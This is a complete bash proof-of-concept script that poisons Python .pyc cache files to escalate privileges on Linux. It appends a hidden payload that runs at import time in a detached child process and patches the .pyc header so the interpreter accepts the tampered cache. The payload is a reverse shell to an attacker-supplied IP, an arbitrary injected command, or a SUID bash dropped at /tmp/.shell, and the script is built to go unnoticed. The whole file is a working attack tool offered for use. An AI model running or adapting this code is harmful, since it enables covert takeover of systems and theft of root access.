#!/bin/bash
# Python .pyc Cache Poisoning - Privilege Escalation
# Usage: ./poc.sh <target.pyc> <original.py> [options]

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

banner() {
    echo -e "${YELLOW}  ╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}  ██████╗ ██╗   ██╗ ██████╗ ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗${NC}"
    echo -e "${BLUE}  ██╔══██╗╚██╗ ██╔╝██╔════╝ ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║${NC}"
    echo -e "${BLUE}  ██████╔╝ ╚████╔╝ ██║      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║${NC}"
    echo -e "${BLUE}  ██╔═══╝   ╚██╔╝  ██║      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║${NC}"
    echo -e "${BLUE}  ██║        ██║   ╚██████╗ ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║${NC}"
    echo -e "${BLUE}  ╚═╝        ╚═╝    ╚═════╝ ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝${NC}"
    echo -e "${YELLOW}  ║          Python .pyc Cache Poisoning  |  Privilege Escalation        ║${NC}"
    echo -e "${YELLOW}  ╚══════════════════════════════════════════════════════════════════════╝${NC}\n"
}

usage() {
    # Exit code: 0 when help was explicitly requested, 1 on misuse.
    local code="${1:-1}"
    echo -e "Usage: $0 <target.pyc> <original.py> [options]\n"
    echo -e "Arguments:"
    echo -e "  <target.pyc>          Path to the .pyc file in __pycache__ to poison"
    echo -e "  <original.py>         Path to the original .py source file\n"
    echo -e "Options:"
    echo -e "  -c, --cmd <command>   Command to inject"
    echo -e "  -i, --ip  <ip>        Attacker IP for reverse shell"
    echo -e "  -p, --port <port>     Attacker port (default: 4444)"
    echo -e "  -s, --suid            Drop SUID shell to /tmp/.shell"
    echo -e "  -h, --help            Show this help\n"
    echo -e "Examples:"
    echo -e "  $0 __pycache__/pyc_mod.cpython-312.pyc pyc_mod.py -s"
    echo -e "  $0 __pycache__/pyc_mod.cpython-312.pyc pyc_mod.py -i 10.10.14.5 -p 4444"
    echo -e "  $0 __pycache__/pyc_mod.cpython-312.pyc pyc_mod.py -c 'chmod +s /bin/bash'"
    exit "$code"
}

check_deps() {
    for dep in python3; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${RED}[-]${NC} Missing dependency: $dep"
            exit 1
        fi
    done
}

get_file_size() {
    stat -c%s "$1" 2>/dev/null || stat -f%z "$1" 2>/dev/null || echo 0
}

write_malicious_py() {
    local outfile="$1"
    local original_py="$2"

    # Stealth: embed the ORIGINAL source so the module keeps its real public API
    # (functions, classes, constants). The payload is appended and runs in a
    # detached child at import time. Result for the victim program:
    #   * all original attributes still exist  -> no AttributeError / traceback
    #   * payload runs in a forked+setsid child -> no blocking, no terminal output
    #   * after the shell closes, the program continues exactly as normal
    if [[ "$MODE" == "revshell" ]]; then
        python3 - "$outfile" "$original_py" "$ATTACKER_IP" "$ATTACKER_PORT" << 'PYEOF'
import sys
outfile, orig, ip, port = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4])
with open(orig) as f:
    original = f.read()
inject = f'''
# --- injected ---
import os as _o
try:
    if _o.fork() == 0:
        _o.setsid()
        import pty as _p, socket as _s
        _sk = _s.socket(); _sk.connect(({ip!r}, {port}))
        [_o.dup2(_sk.fileno(), _fd) for _fd in (0, 1, 2)]
        _p.spawn("sh")
        _o._exit(0)
except Exception:
    pass
# --- end injected ---
'''
with open(outfile, 'w') as f:
    f.write(original.rstrip('\n') + '\n' + inject)
PYEOF
    else
        python3 - "$outfile" "$original_py" "$PAYLOAD" << 'PYEOF'
import sys
outfile, orig, payload = sys.argv[1], sys.argv[2], sys.argv[3]
with open(orig) as f:
    original = f.read()
inject = f'''
# --- injected ---
import os as _o, subprocess as _sp
try:
    if _o.fork() == 0:
        _o.setsid()
        _sp.run({payload!r}, shell=True,
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL, stdin=_sp.DEVNULL)
        _o._exit(0)
except Exception:
    pass
# --- end injected ---
'''
with open(outfile, 'w') as f:
    f.write(original.rstrip('\n') + '\n' + inject)
PYEOF
    fi
}

inject_payload() {
    local target_pyc="$1"
    local original_py="$2"

    local original_size
    original_size=$(get_file_size "$original_py")
    echo -e "${BLUE}[*]${NC} Original source size: $original_size bytes"

    local tmpdir
    tmpdir=$(mktemp -d)
    # Guarantee cleanup on every exit path (success, error, signal).
    trap 'rm -rf "$tmpdir"' RETURN

    local malicious_py="${tmpdir}/malicious.py"

    write_malicious_py "$malicious_py" "$original_py"

    # Note: the malicious source size is irrelevant — Python validates the size
    # field stored in the .pyc header against the .py on disk, and we patch that
    # field directly below. No source padding required.

    echo -e "${BLUE}[*]${NC} Compiling malicious .pyc..."
    if ! python3 -m py_compile "$malicious_py"; then
        echo -e "${RED}[-]${NC} Compilation failed"
        exit 1
    fi

    local compiled_pyc
    compiled_pyc=$(find "$tmpdir" -name "*.pyc" -print -quit)

    if [[ -z "$compiled_pyc" ]]; then
        echo -e "${RED}[-]${NC} Compilation failed — no .pyc generated"
        exit 1
    fi

    echo -e "${BLUE}[*]${NC} Validating target & patching .pyc header..."
    # Single Python pass: verify version compatibility, verify the target uses
    # timestamp-based invalidation, then patch mtime+size from the original .py.
    if ! python3 - "$compiled_pyc" "$target_pyc" "$original_py" << 'PYEOF'
import sys, struct, os

mal_path  = sys.argv[1]
tgt_path  = sys.argv[2]
orig_py   = sys.argv[3]

with open(tgt_path, 'rb') as f:
    tgt_header = f.read(16)
if len(tgt_header) < 16:
    print(f"[-] Target .pyc header too short ({len(tgt_header)} bytes)")
    sys.exit(1)

with open(mal_path, 'r+b') as f:
    mal_header = bytearray(f.read(16))

    # 1) Magic number (bytes 0-3) must match the interpreter that will load the
    #    cache, otherwise Python silently discards it. Both files were produced
    #    by cpython, so a mismatch means we compiled with the wrong version.
    if mal_header[0:4] != tgt_header[0:4]:
        print("[-] Python magic number mismatch:")
        print(f"      target    : {tgt_header[0:4].hex()}")
        print(f"      compiled  : {mal_header[0:4].hex()}")
        print("    Compile with the SAME Python version as the target .pyc "
              "(see the cpython-XYZ tag in the filename).")
        sys.exit(1)

    # 2) Bit field (bytes 4-7) selects the invalidation mode (PEP 552).
    #    Bit 0 set => hash-based .pyc; mtime/size patching would be ignored.
    tgt_flags = struct.unpack_from('<I', tgt_header, 4)[0]
    if tgt_flags & 0b01:
        print("[-] Target .pyc uses HASH-based invalidation (PEP 552).")
        print("    Timestamp/size patching will not work against this cache.")
        sys.exit(1)

    # 3) Patch mtime + size to match the original .py currently on disk, which
    #    is what Python checks at import time for timestamp-based caches.
    orig_mtime = int(os.stat(orig_py).st_mtime)
    orig_size  = os.stat(orig_py).st_size
    struct.pack_into('<I', mal_header, 8,  orig_mtime & 0xFFFFFFFF)
    struct.pack_into('<I', mal_header, 12, orig_size  & 0xFFFFFFFF)

    f.seek(0)
    f.write(mal_header)

print(f"[+] Magic OK, timestamp-based cache, header patched: "
      f"mtime={orig_mtime}, size={orig_size}")
PYEOF
    then
        echo -e "${RED}[-]${NC} Header validation/patching failed — aborting (target left untouched)"
        exit 1
    fi

    echo -e "${BLUE}[*]${NC} Verifying headers..."
    local orig_header mal_header
    orig_header=$(python3 -c 'import sys;print(open(sys.argv[1],"rb").read(16).hex())' "$target_pyc")
    mal_header=$(python3 -c 'import sys;print(open(sys.argv[1],"rb").read(16).hex())' "$compiled_pyc")
    echo -e "    Target   : $orig_header"
    echo -e "    Malicious: $mal_header"

    # Preserve a clean backup; never clobber it on re-runs.
    if [[ -e "${target_pyc}.bak" ]]; then
        echo -e "${YELLOW}[!]${NC} Backup already exists, keeping it: ${target_pyc}.bak"
    else
        cp "$target_pyc" "${target_pyc}.bak"
        echo -e "${GREEN}[+]${NC} Backup: ${target_pyc}.bak"
    fi

    cp "$compiled_pyc" "$target_pyc"
    echo -e "${GREEN}[+]${NC} Poisoned .pyc placed at: $target_pyc"
}

# ─── Main ────────────────────────────────────────────────────────────────────

banner
[[ $# -lt 2 ]] && usage 1

TARGET_PYC=""
ORIGINAL_PY=""
CMD=""
ATTACKER_IP=""
ATTACKER_PORT="4444"
SUID_MODE=false

# First two positional args
TARGET_PYC="$1"; shift
ORIGINAL_PY="$1"; shift

require_value() {
    # $1 = flag name, $2 = its value (may be unset)
    if [[ -z "${2:-}" ]]; then
        echo -e "${RED}[-]${NC} Option $1 requires a value"
        usage 1
    fi
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help) usage 0 ;;
        -c|--cmd)  require_value "$1" "${2:-}"; CMD="$2"; shift 2 ;;
        -i|--ip)   require_value "$1" "${2:-}"; ATTACKER_IP="$2"; shift 2 ;;
        -p|--port) require_value "$1" "${2:-}"; ATTACKER_PORT="$2"; shift 2 ;;
        -s|--suid) SUID_MODE=true; shift ;;
        *) echo -e "${RED}[-]${NC} Unknown argument: $1"; usage 1 ;;
    esac
done

check_deps

[[ ! -f "$TARGET_PYC" ]]   && { echo -e "${RED}[-]${NC} .pyc not found: $TARGET_PYC";   exit 1; }
[[ ! -f "$ORIGINAL_PY" ]]  && { echo -e "${RED}[-]${NC} .py not found: $ORIGINAL_PY";   exit 1; }
[[ ! -w "$TARGET_PYC" ]]   && { echo -e "${RED}[-]${NC} No write permission: $TARGET_PYC"; exit 1; }

# Resolve payload + execution mode. Precedence: SUID > CMD > reverse shell.
# MODE drives write_malicious_py so it stays consistent with PAYLOAD.
MODE=""
PAYLOAD=""
if $SUID_MODE; then
    MODE="cmd"
    PAYLOAD="cp /bin/bash /tmp/.shell && chmod +s /tmp/.shell"
    echo -e "${YELLOW}[!]${NC} SUID mode - after execution run: /tmp/.shell -p\n"
elif [[ -n "$CMD" ]]; then
    MODE="cmd"
    PAYLOAD="$CMD"
elif [[ -n "$ATTACKER_IP" ]]; then
    MODE="revshell"
    # Validate port: numeric, 1-65535.
    if ! [[ "$ATTACKER_PORT" =~ ^[0-9]+$ ]] || (( ATTACKER_PORT < 1 || ATTACKER_PORT > 65535 )); then
        echo -e "${RED}[-]${NC} Invalid port: $ATTACKER_PORT (must be 1-65535)"
        exit 1
    fi
    PAYLOAD="(reverse shell to ${ATTACKER_IP}:${ATTACKER_PORT})"
    echo -e "${YELLOW}[!]${NC} Start listener: nc -lvnp ${ATTACKER_PORT}\n"
else
    echo -e "${RED}[-]${NC} No payload specified. Use -s, -c, or -i."
    usage 1
fi

echo -e "${BLUE}[*]${NC} Target .pyc  : $TARGET_PYC"
echo -e "${BLUE}[*]${NC} Original .py : $ORIGINAL_PY"
echo -e "${BLUE}[*]${NC} Payload      : $PAYLOAD\n"

inject_payload "$TARGET_PYC" "$ORIGINAL_PY"

echo -e "\n${GREEN}[+]${NC} Done — payload fires on next privileged execution.\n"
